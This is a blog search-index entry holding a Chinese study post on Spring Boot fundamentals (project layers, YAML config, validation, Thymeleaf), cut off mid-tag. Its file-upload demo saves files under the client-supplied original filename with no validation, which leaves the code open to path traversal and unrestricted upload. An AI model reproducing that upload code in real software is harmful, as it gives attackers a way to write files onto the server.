<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>【Java安全】基础配置篇-01</title>
      <link href="/2024/07/19/2024-07-19-Java%E5%AE%89%E5%85%A801/"/>
      <url>/2024/07/19/2024-07-19-Java%E5%AE%89%E5%85%A801/</url>
      
        <content type="html"><![CDATA[<h1 id="java安全-01">Java安全-01</h1><h2 id="前置基础">前置基础</h2><p>基于SpringBoot框架展开开发，首先要了解一下整个项目的分层结构</p><p>从上到下：</p><ul><li>客户端界面：表现层 UI层 界面层</li><li>服务层/业务层：直接为客户端提供的服务或功能</li><li>领域层：系统内的领域活动</li><li>DAO层：数据访问对象，通过领域实体对象操作数据库</li></ul><hr><p>实战代码结构：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d60b16592e4a6be125628a0d788d6eeb.png" alt="image-20240714014715347"></p><p>其实最外层主要分为两块：</p><ul><li>java目录：主要存放Java代码</li><li>resources目录：主要存放静态资源文件，如html、js、css等</li></ul><p>进入到内层：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/f351b583cdcf0a326253a4a5e0a5e98d.png" alt="image-20240714015540046"></p><ul><li>Java下：<ul><li>annotation：放置项目自定义注解</li><li>Controller：存放控制器，接收从前端传来的参数，负责对访问控制进行转发，各类基本参数校验，或者不复用的业务简单处理</li><li>dao层：数据访问层，与数据库进行交互，负责数据库操作，在Mybites框架中存放自定义的Mapper接口</li><li>entity：存放实体类</li><li>interceptor：拦截器</li><li>service：存放服务类，负责业务模块逻辑处理，其中包含两层：一是Service，用来声明接口；二是ServiceImpl，作为实现类实现接口中的方法</li><li>utils：存放工具类</li><li>dto：存放数据传输对象（Data Transfer Object）, 如请求参数和返回结果</li><li>vo：视图对象（View Object）用于封装客户端请求的数据，防止部分数据泄露，保证数据安全</li><li>constant：存放常量</li><li>filter：存放过滤器</li></ul></li><li>resources目录下<ul><li>mapper：存放Mybites的mapper.xml文件</li><li>static：静态资源文件目录（JavaScript、CSS、图片），在这个目录中所有文件可以被直接访问</li><li>template：存放模板文件</li><li>application.properties：Spring Boot默认配置文件</li></ul></li></ul><p><img src="https://img-blog.csdnimg.cn/img_convert/c9c9af7005f02e22f1ff9001de092a49.png" alt="image-20240714105150398"></p><p>这里的API层 就相当于Controller层</p><ul><li>解释一下Controller和Service之间的区别</li></ul><p>Controller层只会从前端接收数据，然后进行数据转发到Service层，不做具体的操作</p><p><img src="https://img-blog.csdnimg.cn/img_convert/cffd1d58e7206b49341bb1291a7fee37.png" alt="image-20240714130114731"></p><p>一些参数的判断验证，在Controller层进行验证，比如想上传文件的话，可以先在Controller层验证文件名后缀</p><hr><h2 id="小demo开发记录">小demo开发记录</h2><h3 id="文件上传">文件上传</h3><p>为了方便整个系统的开发，我们要规范化文件上传的接口，放在Service层中，保证可以在任何界面都可以去调用并进行上传</p><p>首先是Controller层</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.thymeleaf.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.thymeleaf.service.UploadService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.multipart.MultipartFile;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.support.RedirectAttributes;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/upload&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UploadController</span> &#123;</span><br><span class="line">    <span class="comment">//解释一下自动装配的功能：使得控制器类能够使用服务类的方法而无需手动创建服务类的实例</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UploadService service;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">showUploadForm</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;!DOCTYPE html&gt;&quot;</span></span><br><span class="line">                + <span class="string">&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;File Upload&lt;/title&gt;&lt;/head&gt;&quot;</span></span><br><span class="line">                + <span class="string">&quot;&lt;body&gt;&lt;h1&gt;Upload a File&lt;/h1&gt;&quot;</span></span><br><span class="line">                + <span class="string">&quot;&lt;form method=\&quot;POST\&quot; enctype=\&quot;multipart/form-data\&quot; action=\&quot;/upload\&quot;&gt;&quot;</span></span><br><span class="line">                + <span class="string">&quot;&lt;input type=\&quot;file\&quot; name=\&quot;file\&quot; /&gt;&quot;</span></span><br><span class="line">                + <span class="string">&quot;&lt;button type=\&quot;submit\&quot;&gt;Upload&lt;/button&gt;&quot;</span></span><br><span class="line">                + <span class="string">&quot;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">handleFileUpload</span><span class="params">(<span class="meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file,</span></span><br><span class="line"><span class="params">                                   RedirectAttributes redirectAttributes)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> service.uploadFile(file);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You successfully uploaded &#x27;&quot;</span> + fileName + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Failed to upload &#x27;&quot;</span> + file.getOriginalFilename() + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>路径是<code>/upload</code>  直接访问是get请求 会展示表单</p><p><img src="https://img-blog.csdnimg.cn/img_convert/cb7e973cd4fe06b816a51e3a158329a8.png" alt="image-20240714164942666"></p><p>点击upload上传文件，是post请求 会上传文件</p><p>Service层：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.thymeleaf.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.multipart.MultipartFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UploadService</span> &#123;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">uploadFile</span><span class="params">(MultipartFile file)</span> <span class="keyword">throws</span> IOException;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体方法实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.thymeleaf.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.thymeleaf.service.UploadService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.multipart.MultipartFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UploadServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UploadService</span> &#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;file.upload-dir&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String uploadDir;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">uploadFile</span><span class="params">(MultipartFile file)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="keyword">if</span>(file.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Failed to upload empty file.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">File</span> <span class="variable">dest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(uploadDir + <span class="string">&quot;/&quot;</span> + file.getOriginalFilename());</span><br><span class="line">        file.transferTo(dest); <span class="comment">//将上传的文件保存到指定的目标文件。</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> file.getOriginalFilename();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中记得在配置文件中指定一下目录</p><p><img src="https://img-blog.csdnimg.cn/img_convert/2be2ad28272d2250987cb410b75e6680.png" alt="image-20240714165304202"></p><hr><h2 id="课程学习记录">课程学习记录</h2><h2 id="初始配置阶段">初始配置阶段</h2><p>学习守则：学一个东西前，先自己列一个学习路线，有目标有方向一步一步来</p><p><img src="https://img-blog.csdnimg.cn/img_convert/9109be4db186e1143fc5c9ccc1033cdc.png" alt="image-20240714195514823"></p><h3 id="0x00-微服务阶段历史">0x00 微服务阶段历史</h3><p>all in one：所有功能</p><p>微服务架构：把功能进行分区存储，对某个功能</p><p>了解Spring家族：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5955d6b42a7897adccac0189e254f3e4.png" alt="image-20240715135749019"></p><p>Spring Boot：构建一切</p><p>Spring Cloud：协调一切</p><p>Spring Cloud Data Flow：连接一切</p><h3 id="0x01-第一个springboot程序">0x01 第一个SpringBoot程序</h3><p>玩一下，修改banner</p><p><a href="https://www.bootschool.net/ascii-art/search">https://www.bootschool.net/ascii-art/search</a></p><p><img src="https://img-blog.csdnimg.cn/img_convert/db22a74efde56806e220092bce4d05bf.png" alt="image-20240715202451661"></p><p>在source目录下 创建banner.txt文件即可</p><p><img src="https://img-blog.csdnimg.cn/img_convert/838d6d36ff1aa3adcf1276de148c6834.png" alt="image-20240715202521957"></p><p>6 成功了</p><h3 id="0x02-原理初探">0x02 原理初探</h3><p>自动配置：</p><p>pom.xml：</p><ul><li>Spring-boot-dependencies：核心依赖在父工程中</li><li>在引入Springboot依赖 不需要指定版本 因为有些版本仓库</li></ul><p>启动器：</p><ul><li><pre><code class="language-xml">&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  starter后面指定场景，上面这个就会棒我们自动导入web环境所有的依赖</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">主程序：</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">//@SpringBootApplication ： 解释一下这个注解 这个是标注这个是Springboot的一个应用  如果没有 直接整个崩掉</span><br><span class="line">// 作用就是：启动类下的所有资源被导入 </span><br><span class="line">@SpringBootApplication</span><br><span class="line">public class BeginnerApplication &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //将Springboot启动</span><br><span class="line">        SpringApplication.run(BeginnerApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre></li></ul><p>解释一下其中的注解，点进去读源码</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a94a1b378c2cd4ff9e01bf2559fe2349.png" alt="image-20240715204554680"></p><ul><li>注解</li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@SpringBootConfiguration : Springboot的配置</span><br><span class="line">@Configuration:  spring配置类</span><br><span class="line">@Component : 说明这是一个spring的组件</span><br><span class="line"></span><br><span class="line">@EnableAutoConfiguration : 自动配置</span><br><span class="line">@AutoConfigurationPackage : 自动配置包</span><br><span class="line">@Import(&#123;Registrar.class&#125;) : 导入选择器   注册</span><br><span class="line">@Import(&#123;AutoConfigurationImportSelector.class&#125;)</span><br></pre></td></tr></table></figure><h3 id="0x03-springboot配置文件">0x03 SpringBoot配置文件</h3><p>一般操作 首先删除自动生成的<code>application.properties</code></p><p>然后新建一个配置文件<code>application.yaml</code> 修改下后缀 名字不需要改变</p><blockquote><p>介绍一下两者的区别：</p><ul><li>application.properties<ul><li>语法结构：key=value</li></ul></li><li>application.yaml<ul><li>语法结构：key: value  （注意这个地方在冒号后面有一个空格）</li></ul></li></ul></blockquote><p>yaml基础语法：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#普通的key-value</span></span><br><span class="line"><span class="attr">name:</span> <span class="string">qinjing</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#对象</span></span><br><span class="line"><span class="attr">student:</span></span><br><span class="line"><span class="attr">name:</span> <span class="string">qinjiang</span></span><br><span class="line"><span class="attr">age:</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#行内写法</span></span><br><span class="line"><span class="attr">student:</span> &#123;<span class="attr">name:</span> <span class="string">qinjiang</span>,<span class="attr">age:</span> <span class="number">3</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#数组  两个空格</span></span><br><span class="line"><span class="attr">pets:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">cat</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">dog</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">pig</span></span><br><span class="line">   </span><br><span class="line"><span class="attr">pets:</span> [<span class="string">cat</span>, <span class="string">dog</span>, <span class="string">pig</span>]</span><br></pre></td></tr></table></figure><p>之所以使用yaml 是因为可以给实体类赋值</p><h3 id="0x04-给属性赋值的几种方法">0x04 给属性赋值的几种方法</h3><p>首先可以使用注解</p><p><img src="https://img-blog.csdnimg.cn/img_convert/c9d637da4c4b5a7bd6c15df6e545ba7e.png" alt="image-20240717122821132"></p><p>来test里面测试一下</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5c3276ce6bbcafa31954dbe63a9a9c23.png" alt="image-20240717122909837"></p><p>第二种方法：在yaml配置文件中赋值 核心</p><p><img src="https://img-blog.csdnimg.cn/img_convert/86f5fa534e12f5f0281c186d9dd30ca1.png" alt="image-20240717124728668"></p><p>注意之所以能注入成功，还需要设置一些配置</p><p><img src="https://img-blog.csdnimg.cn/img_convert/99084eb25e45686f8c11871d6965160b.png" alt="image-20240717124822562"></p><p>上面爆红 不影响工作  这是去yaml中找person 去注入数据</p><p>可玩性：直接写一些占位符</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a48ff0c2ccf4814c4b3e5720fa2a5d64.png" alt="image-20240717130911915"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/775f6dbdd4c9600d100875fc29e324cd.png" alt="image-20240717131104680"></p><p>表达式</p><p><img src="https://img-blog.csdnimg.cn/img_convert/514840f8dea08c2ab8c3d443e43b628b.png" alt="image-20240717131933152"></p><p>如果前面这个参数存在 则读取参数 否则直接是hello</p><p><img src="https://img-blog.csdnimg.cn/img_convert/0bf721c2e7c5cc9b7df97d8fdade8f64.png" alt="image-20240717132045472"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/101c33e3febce14f59dc975962610f7f.png" alt="image-20240717132034140"></p><p>松散绑定：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/9d16f4ae83d71f8c2fafccfbf9e46438.png" alt="image-20240718133015787"></p><p>注意一下就好 以后看yaml文件 如果看到横杠分隔  知道怎么个事就好</p><hr><p>第三种方法 配置properties</p><p><img src="https://img-blog.csdnimg.cn/img_convert/c3cbe6a9d13cd089e796cee07bf57a53.png" alt="image-20240717130601189"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/98a3d2bd6f26200caa34a48eb11ab7e3.png" alt="image-20240717130631007"></p><p>嘿嘿 成功</p><p><img src="https://img-blog.csdnimg.cn/img_convert/9c46c1df4c3e43e77967e61891d0da4e.png" alt="image-20240717130651774"></p><p>properties防止乱码小技巧：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/87d8ea33e9455e68a8c4c9f1c161e3dc.png" alt="image-20240717124658627"></p><h3 id="0x05-jsr303校验">0x05 JSR303校验</h3><p>在字段加一层过滤器验证，保证数据的合法性</p><p>使用方法</p><p><img src="https://img-blog.csdnimg.cn/img_convert/9b67f53e5ff2fed11f961bfa57c2c206.png" alt="image-20240718163345769"></p><p>注意一定要在pom文件中配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--验证数据的依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-validation<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以修改默认报错语句</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b2818b2b3352ea8e17da6481d621dbf3.png" alt="image-20240718163715176"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/6d93dd8f67678f88157c24156164a48b.png" alt="image-20240718163637171"></p><p>jsr303 校验语句</p><p><img src="https://img-blog.csdnimg.cn/img_convert/0b6f89f7926336d44494a771c34bfe9c.png" alt="image-20240718163909131"></p><h3 id="0x06-多环境配置">0x06 多环境配置</h3><p>在配置application.properties时  有默认环境 测试环境 上线环境 但是逐个修改很麻烦 可以直接进行多环境配置</p><p><img src="https://img-blog.csdnimg.cn/img_convert/528d42ff449489f1aa8bdb8820e16c5c.png" alt="image-20240718173542268"></p><p>下面凸显yaml的多文档模式的便捷</p><p><img src="https://img-blog.csdnimg.cn/img_convert/76c9444be2aa036c8c4aacd49f138c3d.png" alt="image-20240718173802610"></p><p>分割线就是划分文件</p><h3 id="0x07-再探自动配置原理">0x07 再探自动配置原理</h3><p>学这个的目的 是让我们更会写内容 在思考中写配置 而不是看文档背</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d4d4ee1accbc687a46f007244c280955.png" alt="image-20240718180546610"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/5e8fc7b290e4be82e6f861308ea5d86b.png" alt="image-20240718181340719"></p><p>遇到什么 看什么 配置就是在pom中加一个starter启动即可</p><h2 id="开发阶段">开发阶段</h2><h3 id="0x00-springboot-web开发">0x00 SpringBoot Web开发</h3><p>目录结构：</p><p>在resources中 static放静态资源    templates放模版</p><p><img src="https://img-blog.csdnimg.cn/img_convert/eb08d15e692c5490c95967c986b4ae0a.png" alt="image-20240718202358168"></p><p>导入静态资源</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a0f437b9dfc568417b6662a1100e8a83.png" alt="image-20240718204301920"></p><p>前提引入maven</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.webjars<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jquery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>访问成功拿下</p><p><img src="https://img-blog.csdnimg.cn/img_convert/82faae6bce93797d2f7be258f0984e0e.png" alt="image-20240718204420465"></p><ul><li>探索哪些可以直接被访问到</li></ul><p><img src="https://img-blog.csdnimg.cn/img_convert/7e06546be0c0961c2b73a8fc8ec64da8.png" alt="image-20240718205659267"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/9a7df38c8dbc8744c44c1edb28526970.png" alt="image-20240718205750246"></p><p>成功访问public文件夹下的内容    注意： 优先级 按这个顺序  第一个就是在当前目录下  第二个指还可以创建一个resources文件夹</p><p><img src="https://img-blog.csdnimg.cn/img_convert/afcad6b9171e80482f8a1ca90e438ad2.png" alt="image-20240718205842027"></p><p>一般习惯：</p><ul><li>public：大家公共访问的资源</li><li>resources：upload大家上传的资源</li><li>static：index.html首页 + 静态资源 比如图片之类的</li><li>templates：所有该目录下的文件 只能通过Controller来</li></ul><blockquote><p>总结：</p><ol><li>在Springboot，我们可以使用以下方式处理静态资源<ul><li>webjars   localhost:8081/webjars/    这个方式不推荐</li><li>public static  /**  resources   localhost:8081/</li></ul></li><li>要学会读源码  因为技术在不断更新  不能全靠老师  上面的文件目录就来自于源码的读取</li></ol></blockquote><h4 id="首页和图标定制">首页和图标定制</h4><p>首页 index.html</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5fe28dd104a372ce4db4c91fc03801c0.png" alt="image-20240718212328379"></p><p>直接访问 非常完美</p><p><img src="https://img-blog.csdnimg.cn/img_convert/66e6f890a898725ba7e67bba1102f780.png" alt="image-20240718212425277"></p><h3 id="0x01-模版引擎">0x01 模版引擎</h3><ul><li>概念</li></ul><p>先解释一下这个东西的作用</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a1588ef84c60193e1c8a46abaae7c28e.png" alt="image-20240718234402052"></p><p>简单来说就是在<strong>前端界面</strong>预留位置 然后结合<strong>后端的数据</strong> 进行<strong>渲染</strong> 生成最终呈现给用户的界面</p><ul><li>常见引擎</li></ul><p>jsp</p><p>freemarker</p><p>Thymeleaf</p><ul><li>常用Thymeleaf使用</li></ul><p>导入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Thymelead  基于3.x开发--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.thymeleaf<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>thymeleaf-spring5<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.thymeleaf.extras<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>thymeleaf-extras-java8time<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>默认放在templates目录下 后缀名是html</p><p><img src="https://img-blog.csdnimg.cn/img_convert/924e96cef5993ecfe6d348146c448888.png" alt="image-20240719083421574"></p><blockquote><p>结论：</p><p>只要需要使用thymeleaf 只需要导入对应的依赖就可以</p><p>我们将html放在templates目录下即可</p><p>使用方法如下：在Controller层引过去</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/hello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello, world!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此外一定要掌握钻研  读源码的本领  要不然就会被直接公司招新人  你就被淘汰</p></blockquote><p>声明命名空间  在html文件中 添加后面这一句xm…</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>所有的html元素都可以被thymeleaf接管：  即th:元素名</p><p>小demo：</p><p>Controller层：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/9db6ad27f9d287d6e374a6d22824d586.png" alt="image-20240719151742665"></p><p>html：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/628a901b9f0987e856e69ebbcd92ae61.png" alt="image-20240719151917167"></p><p>效果：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/616527efa6310288b48049f8f8a0a921.png" alt="image-20240719151934872"></p><h3 id="0x02-thymeleaf语法">0x02 Thymeleaf语法</h3><blockquote><p>取变量：${…}</p><p>取URL：@{…}</p></blockquote><p>文本转义：text</p><p>不转义：utext</p><p>demo：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/8ea1b2af7a9d9f15fbf76c31e199f0bd.png" alt="image-20240719152341702"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/9c2207ef9360ddbc399e094ebcc12b4d.png" alt="image-20240719152408370"></p><p>效果：<img src="https://img-blog.csdnimg.cn/img_convert/ee7228b372c2b7ef2ff1a3e1a062e0f7.png" alt="image-20240719152426796"></p><p>检查一下网页代码 可以发现尖括号被转义了  这也就提供了防范xss的思路</p><p><img src="https://img-blog.csdnimg.cn/img_convert/8f84601f8e0a8d6eeb737b6e05cae2a8.png" 